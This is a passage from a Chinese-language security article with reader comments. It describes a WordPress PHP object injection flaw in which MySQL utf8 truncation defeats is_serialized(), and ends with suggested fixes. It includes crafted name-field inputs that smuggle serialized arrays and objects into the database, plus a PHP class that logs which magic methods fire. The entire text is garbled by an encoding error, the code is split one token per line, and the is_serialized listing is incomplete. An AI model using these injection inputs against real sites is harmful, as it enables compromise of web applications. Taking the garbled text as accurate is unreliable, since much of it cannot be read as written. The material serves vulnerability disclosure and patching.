<p>æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–çš„å€¼çš„è¯ï¼Œå®ƒå°±ä¼šå†åºåˆ—åŒ–ä¸€ä¸‹ï¼Œè¿™å°±æ˜¯ç°åœ¨å‘ç”Ÿçš„æƒ…å†µï¼Œä½ çœ‹ï¼Œæ•°æ®åº“é‡Œçš„ä¸œè¥¿ä¸æ˜¯i:1;è€Œæ˜¯s:4:&quot;i:1;&quot;;ï¼Œå½“è§£åºåˆ—åŒ–çš„æ—¶å€™å®ƒå°±æ˜¾ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ç°åœ¨è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>ä½ æ‡‚çš„ï¼Œè¿™å¸–å­çš„å†…å®¹ä¹Ÿå­˜åœ¨æ•°æ®åº“é‡Œï¼Œä¸Šé¢è¿™å°±è¯´æ˜äº†ä¸ºä»€ä¹ˆæˆ‘ä»¬å¤±è´¥äº†ã€‚å¦‚æœæˆ‘ä»¬ç°åœ¨æƒ³å¾€æ•°æ®åº“æ’ä¸€ä¸ªåºåˆ—åŒ–åçš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨æˆ‘ä»¬æ’å…¥æ•°æ®çš„æ—¶å€™è®©is_serialized()è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªfalseï¼Œè€Œå½“æˆ‘ä»¬å†ä»æ•°æ®é‡Œå–å®ƒçš„æ—¶å€™ï¼Œå®ƒå°±åº”è¯¥è¿”å›ä¸ªtrueäº†ã€‚</p>
<p>ä½ æ‡‚çš„ï¼ŒMysqlæ•°æ®åº“ï¼Œè¡¨å’Œå­—æ®µéƒ½æœ‰ä»–ä»¬è‡ªå·±çš„charsetå’Œcollation(å­—ç¬¦é›†å’Œå®šåºï¼‰ã€‚WordPresså‘¢ï¼Œé»˜è®¤çš„å­—ç¬¦é›†æ˜¯UTF-8ã€‚ä»è¿™ä¸ªåå­—å°±çœ‹çš„å‡ºæ¥ï¼Œè¿™ä¸ªå­—ç¬¦é›†å®ƒä¸æ”¯æŒå…¨éƒ¨çš„Unicodeå­—ç¬¦ï¼Œä½ è¦æ˜¯å¯¹è¿™ä¸ªæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥çœ‹çœ‹Mathias Bynensçš„è¿™ç¯‡æ–‡ç« ï¼š<a href="http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥" target="_blank">http://mathiasbynens.be/notes/mysql-utf8mb4ï¼Œè¿™æ–‡ç« æ•™äº†æˆ‘UTF-8çš„è¡¨å‚¨å­˜ä¸äº†Unicodeç¼–ç åŒºé—´æ˜¯U+010000åˆ°U+10FFFFçš„å­—ç¬¦ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åœ¨è¿™ä¸ªæƒ…å†µä¸‹å°è¯•ä¿å­˜è¿™äº›å­—ç¬¦å‘¢ï¼Ÿæ˜¾è€Œæ˜“è§ï¼ŒåŒ…æ‹¬è¿™ä¸ªå­—ç¬¦å’Œè¿™ä¸ªå­—ç¬¦ä¹‹åçš„å†…å®¹éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚æ‰€ä»¥åœ¨æˆ‘ä»¬å°è¯•æ’å…¥</a></p>
<p>fooğŒ†bar
çš„æ—¶å€™ï¼ŒMysqlä¼šå¿½ç•¥</p>
<p>ğŒ†bar
è€Œä¿å­˜ä¸ºfooã€‚</p>
<p>è¿™ä¸ªè¿·é¢˜çš„æœ€åä¸€éƒ¨åˆ†å°±æ˜¯æˆ‘ä»¬éœ€è¦æ’å…¥ä¸€ä¸ªç”¨ä»¥ä¸€ä¼šå„¿è§£åºåˆ—åŒ–çš„å†…å®¹ï¼Œä¸ºäº†æµ‹è¯•è¿™ä¸ªï¼Œä½ å¯ä»¥æ’å…¥</p>
<p>1:iğŒ†
ä¸ºä½ çš„åå­—ã€‚æ­£å¦‚æ‰€è§åˆ°çš„ï¼Œç»“æœæ˜¯1ï¼Œæ„å‘³ç€ä½ çš„è¾“å…¥è¢«è§£åºåˆ—åŒ–äº†ï¼Œå¦‚æœä½ è¿˜ä¸ç›¸ä¿¡æˆ‘ï¼Œä½ è¯•ç€è¾“å…¥ä¸€ä¸ªç©ºæ•°ç»„çš„åºåˆ—åŒ–å¹¶ä¸”ä»¥è¯¥å­—ç¬¦ç»“å°¾ï¼š</p>
<p>a:0:{}ğŒ†
ã€‚è¿™ä¸ªç»“æœæ˜¯Arrayã€‚</p>
<p>è®©æˆ‘ä»¬ç»§ç»­</p>
<p>maybe_serialized(&#39;i:1;ğŒ†&#39;)
æ’å…¥äº†æ•°æ®åº“ã€‚WordPressä¸è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå·²åºåˆ—åŒ–çš„æ•°æ®ï¼Œå› ä¸ºå®ƒä¸æ˜¯;æˆ–è€…}ç»“å°¾çš„ã€‚å®ƒä¼šè¿”å›</p>
<p>i:1;ğŒ†
ï¼Œå½“æ’å…¥æ•°æ®åº“çš„æ—¶å€™ï¼Œå®ƒçš„å€¼æ˜¯i:1ï¼Œå½“å®ƒä»æ•°æ®åº“å–å›çš„æ—¶å€™ï¼Œå®ƒæœ‰äº†;æœ€ä¸ºæœ€åä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å®ƒå¯ä»¥è§£åºåˆ—åŒ–æˆåŠŸã€‚ç¢‰å ¡äº†ã€‚æ¼æ´ã€‚</p>
<h2 id="0x02-wordpress-">0x02 WordPress åˆ©ç”¨</h2>
<p>ç°åœ¨æˆ‘ä»¬å±•ç¤ºäº†WordPresså­˜åœ¨PHPå¯¹è±¡æ³¨å…¥æ¼æ´ã€‚è®©æˆ‘ä»¬å°è¯•åˆ©ç”¨å®ƒã€‚æ‰€ä»¥ä¸ºäº†åˆ©ç”¨è¯¥æ¼æ´ï¼ˆé€šè¿‡æ³¨å…¥å¯¹è±¡çš„æ–¹æ³•ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆä»¥ä¸‹æ¡ä»¶çš„classï¼š</p>
<p>1ï¼Œå†…æœ‰â€œæœ‰ç”¨â€çš„æ–¹æ³•å¯è¢«è°ƒç”¨ã€‚
2ï¼Œå­˜åœ¨è¯¥å¯¹è±¡çš„ç±»å·²ç»è¢«åŒ…å«äº†ã€‚</p>
<p>å½“ä¸€ä¸ªå¯¹è±¡è¢«è§£åºåˆ—åŒ–çš„æ—¶å€™ï¼Œ__wakeupå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè¿™è¢«ç§°ä½œPHPçš„é­”æœ¯æ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç¡®å®šä¼šè¢«è°ƒç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šè¿™äº›å‡½æ•°ä¼šæ›´å¤šå†™äº›ï¼Œæˆ‘å†™äº†ä¸€ä¸ªä»¥ä¸‹çš„classæ¥è·å–è¢«è°ƒç”¨çš„classåˆ°/tmp/fumc.logã€‚
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23&lt;?php</p>
<p>class</p>
<p>Foo {</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>logFuncCall(</p>
<p>$funcName</p>
<p>) {</p>
<p>$fh</p>
<p>=</p>
<p>fopen</p>
<p>(</p>
<p>&#39;/tmp/func.log&#39;</p>
<p>,</p>
<p>&#39;a&#39;</p>
<p>);</p>
<p>fwrite(</p>
<p>$fh</p>
<p>,</p>
<p>$funcName</p>
<p>.</p>
<p>&quot;\n&quot;</p>
<p>);</p>
<p>fclose(</p>
<p>$fh</p>
<p>);</p>
<p>}</p>
<p>public</p>
<p>function</p>
<p>__construct() { Foo::logFuncCall(</p>
<p>&#39;__construct(&#39;</p>
<p>.json_encode(func_get_args()).</p>
<p>&#39;)&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__destruct() { Foo::logFuncCall(</p>
<p>&#39;__destruct()&#39;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__get(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__get($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__set(</p>
<p>$name</p>
<p>,</p>
<p>$value</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set($name, value)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__isset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__isset($name)&quot;</p>
<p>);</p>
<p>return</p>
<p>true;}</p>
<p>public</p>
<p>function</p>
<p>__unset(</p>
<p>$name</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__unset($name)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__sleep() { Foo::logFuncCall(</p>
<p>&quot;__sleep()&quot;</p>
<p>);</p>
<p>return</p>
<p>array</p>
<p>();}</p>
<p>public</p>
<p>function</p>
<p>__wakeup() { Foo::logFuncCall(</p>
<p>&quot;__wakeup()&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__toString() { Foo::logFuncCall(</p>
<p>&quot;__toString()&quot;</p>
<p>);</p>
<p>return</p>
<p>&quot;Foo&quot;</p>
<p>;}</p>
<p>public</p>
<p>function</p>
<p>__invoke(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__invoke(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>function</p>
<p>__call(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__call(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__callStatic(</p>
<p>$a</p>
<p>,</p>
<p>$b</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__callStatic(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);}</p>
<p>public</p>
<p>static</p>
<p>function</p>
<p>__set_state(</p>
<p>$a</p>
<p>) { Foo::logFuncCall(</p>
<p>&quot;__set_state(&quot;</p>
<p>. json_encode(func_get_args()).</p>
<p>&quot;)&quot;</p>
<p>);</p>
<p>return</p>
<p>null;}</p>
<p>public</p>
<p>function</p>
<p>__clone() { Foo::logFuncCall(</p>
<p>&quot;__clone()&quot;</p>
<p>);}</p>
<p>}
?&gt;</p>
<p>ä¸ºäº†åˆ—å‡ºè¿™äº›è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œé¦–å…ˆè¦ç¡®è®¤è¿™ä¸ªå‡½æ•°åœ¨è§£åºåˆ—åŒ–å‘ç”Ÿçš„æ—¶å€™æ˜¯è¢«å¼•å…¥è¢«åŒ…å«è¿‡çš„ï¼ˆphpä¸­çš„include requireç­‰ï¼‰ã€‚ä½ å¯ä»¥æŠŠrequire_once(&#39;foo.php&#39;)åŠ åˆ°functions.phpçš„é¡¶ç«¯ã€‚æ¥ä¸‹æ¥ï¼ŒæŠŠåå­—æ”¹ä¸ºO:3:&quot;Foo&quot;:0:{}ğŒ†æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªPHPå¯¹è±¡æ³¨å…¥æ¼æ´ï¼Œå½“åˆ·æ–°é¡µé¢åï¼Œä½ å›çœ‹åˆ°ä½ çš„åå­—å˜æˆäº†Fooï¼Œè¿™ä¹Ÿå°±æ˜¯æ„å‘³ç€è¿™æ˜¯ä¸Šé¢é‚£classä¸­__toString()å‡½æ•°çš„è¿”å›ï¼Œç„¶åè®©æˆ‘ä»¬çœ‹çœ‹éƒ½æœ‰å“ªäº›å‡½æ•°è¢«è°ƒç”¨äº†ã€‚</p>
<p>$ sort -u /tmp/func.log <strong>destruct() </strong>toString() __wakeup()</p>
<p>ç»™å‡ºäº†æˆ‘ä»¬ä¸‰ä¸ªå‡½æ•°ï¼š<strong>wakeup(), </strong>destruct() å’Œ __toString()</p>
<p>å¾ˆä¸å¹¸çš„æ˜¯æˆ‘ä¸èƒ½å†WordPressä¸­æ‰¾åˆ°ä¸€ä¸ªè½½å…¥äº†å¹¶ä¸”è§£åºåˆ—åŒ–æ—¶èƒ½è¢«åˆ©ç”¨é€ æˆå½±å“çš„ç±»ã€‚æ‰€ä»¥ä¸æ˜¯ä¸€ä¸ªWordPressçš„å®‰å…¨é—®é¢˜ï¼Œè€Œæ˜¯ä¸€ä¸ªå¯èƒ½åˆ©ç”¨çš„åœ°æ–¹ã€‚</p>
<p>æ‰€ä»¥æ˜¯ä¸æ˜¯WordPressæ˜¯æœ‰å®‰å…¨éšæ‚£çš„ï¼Œä½†æ˜¯æ— æ³•è¢«åˆ©ç”¨ï¼Ÿä¸ä¸€å®šï¼Œå¦‚æœä½ ç†Ÿæ‚‰WordPressï¼Œä½ å¯èƒ½ä¼šè§‰å¯Ÿåˆ°å¯èƒ½æœ‰ä¸€å †æ’ä»¶å­˜åœ¨æ¼æ´ã€‚è¿™äº›æ’ä»¶æœ‰ä»–ä»¬è‡ªå·±çš„ç±»å¹¶ä¸”å¯èƒ½æš´éœ²å‡ºå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æˆ‘æƒ³åˆ°è¿™ä¸ªåï¼Œå·²ç»å‘ç°äº†ä¸€æ¬¾è‘—åçš„æ’ä»¶å­˜åœ¨æ¼æ´å¹¶ä¸”å¯ä»¥å¯¼è‡´è¿œç¨‹ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>ç”±äºé“å¾·è€ƒè™‘ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä¸ä¼šå‘å¸ƒPoCçš„ï¼Œæœ‰å¤ªå¤šå­˜åœ¨å®‰å…¨æ¼æ´çš„WordPressäº†ã€‚</p>
<h2 id="0x03-wordpress">0x03 ä¿®å¤WordPress</h2>
<p>è¿™ä¸ªä¿®å¤æ–¹å¼æ˜¯ä¿®æ”¹is_serializedå‡½æ•°ï¼Œæˆ‘ç®€å•çš„è¯´è¯´ï¼š
1</p>
<p>2
3</p>
<p>4
5</p>
<p>6
7</p>
<p>8
9</p>
<p>10
11</p>
<p>12
13</p>
<p>14
15</p>
<p>16
17</p>
<p>18
19</p>
<p>20
21</p>
<p>22
23</p>
<p>24
25</p>
<p>26
27</p>
<p>28
29</p>
<p>30
31</p>
<p>32
33</p>
<p>34
35function</p>
<p>is_serialized(</p>
<p>$data</p>
<p>,</p>
<p>$strict</p>
<p>= true ) {</p>
<p>// å¦‚æœä¸æ˜¯å­—ç¬¦ä¸²å°±ä¸ä¼šæ˜¯åºåˆ—åŒ–åçš„æ•°æ®</p>
<p>if</p>
<p>( !</p>
<p>is_string</p>
<p>(</p>
<p>$data</p>
<p>) )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>&#39;:&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[1] )</p>
<p>return</p>
<p>false;</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>$lastc</p>
<p>=</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>1 ];</li>
</ul>
<p>if</p>
<p>(</p>
<p>&#39;;&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>&amp;&amp;</p>
<p>&#39;}&#39;</p>
<p>!==</p>
<p>$lastc</p>
<p>)</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>else</p>
<p>{</p>
<p>//ç¡®è®¤å­˜åœ¨;æˆ–}ä½†ä¸æ˜¯åœ¨ç¬¬ä¸€ä¸ªå­—ç¬¦</p>
<p>if</p>
<p>(</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;;&#39;</p>
<p>) &lt; 3 &amp;&amp;</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;}&#39;</p>
<p>) &lt; 4 )</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>$token</p>
<p>=</p>
<p>$data</p>
<p>[0];</p>
<p>switch</p>
<p>(</p>
<p>$token</p>
<p>) {</p>
<p>case</p>
<p>&#39;s&#39;</p>
<p>:</p>
<p>if</p>
<p>(</p>
<p>$strict</p>
<p>) {</p>
<p>if</p>
<p>(</p>
<p>&#39;&quot;&#39;</p>
<p>!==</p>
<p>$data</p>
<p>[</p>
<p>$length</p>
<ul>
<li>2 ] )</li>
</ul>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>elseif</p>
<p>( false ===</p>
<p>strpos</p>
<p>(</p>
<p>$data</p>
<p>,</p>
<p>&#39;&quot;&#39;</p>
<p>) ) {</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>case</p>
<p>&#39;a&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;O&#39;</p>
<p>:</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9]+:/s&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>case</p>
<p>&#39;b&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;i&#39;</p>
<p>:</p>
<p>case</p>
<p>&#39;d&#39;</p>
<p>:</p>
<p>$end</p>
<p>=</p>
<p>$strict</p>
<p>?</p>
<p>&#39;$&#39;</p>
<p>:</p>
<p>&#39;&#39;</p>
<p>;</p>
<p>return</p>
<p>(bool) preg_match(</p>
<p>&quot;/^{$token}:[0-9.E-]+;$end/&quot;</p>
<p>,</p>
<p>$data</p>
<p>);</p>
<p>}</p>
<p>return</p>
<p>false;</p>
<p>}</p>
<p>è¿™ä¸»è¦çš„åŒºåˆ«æ˜¯å½“$strictå‚æ•°è®¾ç½®ä¸ºfalseçš„æ—¶å€™ï¼Œä¼šæœ‰ä¸€äº›å¼ºåˆ¶æ“ä½œå¯¼è‡´ä¸€ä¸ªå­—ç¬¦ä¸²è¢«æ ‡è®°ä¸ºå·²åºåˆ—åŒ–ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä¸éœ€è¦å¿…é¡»æ˜¯;æˆ–è€…{ï¼ˆè¯‘è€…æ³¨ï¼šä½œè€…æ­¤å¤„åº”è¯¥ç¬”è¯¯äº†ï¼Œåº”è¯¥æ˜¯;æˆ–è€…}),ä¿®å¤äº†æˆ‘æ‰€æäº¤çš„æ¼æ´ã€‚ç°åœ¨å¤§å®¶æœ‰æ²¡æœ‰ç›¸ä¼¼çš„å†…å®¹å¯ä»¥æ‹¿å‡ºæ¥åšä¸ªè®¨è®ºçš„ï¼Ÿ</p>
<p>WordPressä¾æ—§ä½¿ç”¨ç€ä¸å®‰å…¨çš„unserialize()è€Œéå®‰å…¨çš„json_decodeã€‚å®ƒçš„å®‰å…¨æ€§å…¨åœ¨åˆ¤æ–­è§„åˆ™æˆ–è€…Mysqlçš„è§„åˆ™å®ç°ä¸Šã€‚æˆ‘åœ¨ä¸Šé¢æ­éœ²çš„æ¼æ´å®é™…ä¸Šæ˜¯ä½¿ç”¨Mysqlçš„è§„åˆ™å»æ‰æˆ‘è·Ÿåœ¨ç‰¹æ®Šç¬¦å·åçš„æ‰€æœ‰å­—ç¬¦ã€‚</p>
<p>æœ‰ä¸€ä¸ªå¾ˆç®€æ´çš„ä¿®å¤æ–¹æ¡ˆï¼Œä¿®æ”¹ä¸€ä¸‹æ•°æ®åº“ç¼–ç ä¸è¢«æˆªæ–­å°±å¥½ï¼š
ALTER TABLE wp_commentmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_postmeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; ALTER TABLE wp_usermeta CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
ç‰ˆæƒå£°æ˜ï¼šæœªç»æˆæƒç¦æ­¢è½¬è½½ <a href="http://drops.wooyun.org/author/äº”é“å£æ€æ°”" title="ç”± äº”é“å£æ€æ°” å‘å¸ƒ" target="_blank">äº”é“å£æ€æ°”</a>@<a href="http://drops.wooyun.org/" target="_blank">ä¹Œäº‘çŸ¥è¯†åº“</a>
åˆ†äº«åˆ°ï¼š <a href="&quot;åˆ†äº«åˆ°QQç©ºé—´&quot;"></a> <a href="&quot;åˆ†äº«åˆ°æ–°æµªå¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°è…¾è®¯å¾®åš&quot;"></a> <a href="&quot;åˆ†äº«åˆ°äººäººç½‘&quot;"></a> <a href="&quot;åˆ†äº«åˆ°ç½‘æ˜“å¾®åš&quot;"></a> <a href="&quot;ç´¯è®¡åˆ†äº«2æ¬¡&quot;">2</a></p>
<h3 id="-">ç›¸å…³æ—¥å¿—</h3>
<ul>
<li><a href="http://drops.wooyun.org/papers/61" target="_blank">åˆ†æä¸‹éš¾å¾—ä¸€è§çš„RORçš„RCEï¼ˆCVEï¼2013ï¼0156ï¼‰</a></li>
<li><a href="http://drops.wooyun.org/tips/347" target="_blank">æ”»å‡»JavaWebåº”ç”¨[5]-MVCå®‰å…¨</a></li>
<li><a href="http://drops.wooyun.org/tips/236" target="_blank">æ”»å‡»JavaWebåº”ç”¨[3]-SQLæ³¨å…¥[1]</a></li>
<li><a href="http://drops.wooyun.org/tips/688" target="_blank">Flash CSRF</a></li>
<li><a href="http://drops.wooyun.org/tips/127" target="_blank">æµ…è°ˆäº’è”ç½‘ä¸­åŠ«æŒçš„ä¸€äº›äº‹æƒ…</a></li>
<li><a href="http://drops.wooyun.org/tips/135" target="_blank">PHPå®‰å…¨ç¼–ç </a>
ä¸Šä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/576" target="_blank">è€å¤–çš„ä¸€ä»½æ¸—é€æµ‹è¯•æŠ¥å‘Š</a></li>
</ul>
<p>ä¸‹ä¸€ç¯‡:<a href="http://drops.wooyun.org/papers/384" target="_blank">å¯¹æŸåˆ›æ–°è·¯ç”±çš„å®‰å…¨æµ‹è¯•</a></p>
<h3 id="-18-rss-2-0-http-drops-wooyun-org-papers-596-feed-trackback-http-drops-wooyun-org-papers-596-trackback-">æ¥¼è¢«æŠ¢äº† 18 å±‚äº†... <a href="">æŠ¢åº§</a>ã€<a href="http://drops.wooyun.org/papers/596/feed" target="_blank">Rss 2.0</a>æˆ–è€… <a href="http://drops.wooyun.org/papers/596/trackback" target="_blank">Trackback</a></h3>
<ul>
<li><img src="" alt=""> å›­é•¿ | 2013/09/13 11:36 | <a href="">/#</a></li>
</ul>
<p>æ²™å‘ï¼Ÿ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> ccSec | 2013/09/13 11:51 | <a href="">/#</a></li>
</ul>
<p>å¤ªæ¼‚äº®äº†ï¼</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> erevus | 2013/09/13 11:51 | <a href="">/#</a></li>
</ul>
<p>é‚£æˆ‘è¿™æ˜¯åœ°æ¿</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> RuIg | 2013/09/13 11:57 | <a href="">/#</a></li>
</ul>
<p>good job man!</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> 0x334 | 2013/09/13 11:59 | <a href="">/#</a></li>
</ul>
<p>é¡¶ï¼ŒèŠ‚æ“ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> BlackWidow7 | 2013/09/13 13:31 | <a href="">/#</a></li>
</ul>
<p>æ€æ°”ã€‚æ—¥</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> insight-labs | 2013/09/13 14:08 | <a href="">/#</a></li>
</ul>
<p>æ€æ°”å¤ªé‡äº†â€¦â€¦
åˆè¦å€’ä¸‹ä¸€ç‰‡äº†</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> horseluke | 2013/09/13 16:39 | <a href="">/#</a></li>
</ul>
<p>unserializeä¸€ç›´éƒ½æ˜¯å¤§å‘ï¼Œä½†æ‚²å‰§çš„æ˜¯æŸäº›åœºæ™¯è¿˜æ˜¯å¾—è¦ç”¨å®ƒï¼Œæ¯”å¦‚æ–‡ä»¶ç¼“å­˜......</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> MEng | 2013/09/13 20:15 | <a href="">/#</a></li>
</ul>
<p>é«˜å¯Œå¸…!</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Ivan | 2013/09/13 22:57 | <a href="">/#</a></li>
</ul>
<p>pocå•Špoc</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> s3cur1ty | 2013/09/16 10:23 | <a href="">/#</a></li>
</ul>
<p>s:4:&quot;i:1;&quot;;å‹æ ¹å°±æ²¡å†æ•°æ®åº“é‡Œå‡ºç°è¿‡ã€‚ã€‚ã€‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Sct7p | 2013/09/16 13:06 | <a href="">/#</a></li>
</ul>
<p>good job</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> s3cur1ty | 2013/09/16 13:14 | <a href="">/#</a></li>
</ul>
<p>function is_serialized( $data ) {
// if it isn&#39;t a string, it isn&#39;t serialized
if ( ! is_string( $data ) )
return false;
$data = trim( $data );
if ( &#39;N;&#39; == $data )
return true;
$length = strlen( $data );
if ( $length &lt; 4 )
return false;
if ( &#39;:&#39; !== $data[1] )
return false;
$lastc = $data[$length-1];
if ( &#39;;&#39; !== $lastc &amp;&amp; &#39;}&#39; !== $lastc )
return false;
$token = $data[0];
switch ( $token ) {
case &#39;s&#39; :
if ( &#39;&quot;&#39; !== $data[$length-2] )
return false;
case &#39;a&#39; :
case &#39;O&#39; :
return (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data );
case &#39;b&#39; :
case &#39;i&#39; :
case &#39;d&#39; :
return (bool) preg_match( &quot;/^{$token}:[0-9.E-]+;\$/&quot;, $data );
}
return false;
}</p>
<p>éš¾é“æ¥¼ä¸»æ²¡æœ‰çœ‹åˆ°if ( $length &lt; 4 ) return false;
<a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Ray | 2013/09/24 17:12 | <a href="">/#</a></li>
</ul>
<p>æˆ‘ä¼°è®¡å•Šï¼Œæ˜¯ä½œè€…ç¿»è¯‘çš„æ—¶å€™ç¿»ç€ç¿»ç€æŠŠi:1;å†™æˆäº†i:1ï¼Œè€Œi:1;æ­£å¥½æ˜¯4ä¸ªå­—èŠ‚ã€‚</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> é¾™è‡£ | 2013/09/16 16:21 | <a href="">/#</a></li>
</ul>
<p>holy shit</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> é½è¿¹ | 2013/09/17 17:57 | <a href="">/#</a></li>
</ul>
<p>å¼±å¼±çš„é—®ä¸€ä¸‹ åªæœ‰åœ¨ç”¨äº†__toString è¿™ä¸ªé­”æœ¯æ–¹æ³•çš„æ—¶å€™æ‰èƒ½å¤Ÿè§¦å‘å—ï¼Ÿ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> lhshaoren | 2013/09/24 17:05 | <a href="">/#</a></li>
</ul>
<p>è†œæ‹œ</p>
<p><a href="http://drops.wooyun.org/login" target="_blank">ç™»å½•ä»¥å›å¤</a></p>
<ul>
<li><img src="" alt=""> Forever80s | 2013/10/08 22:01 | <a href="">/#</a></li>
</ul>
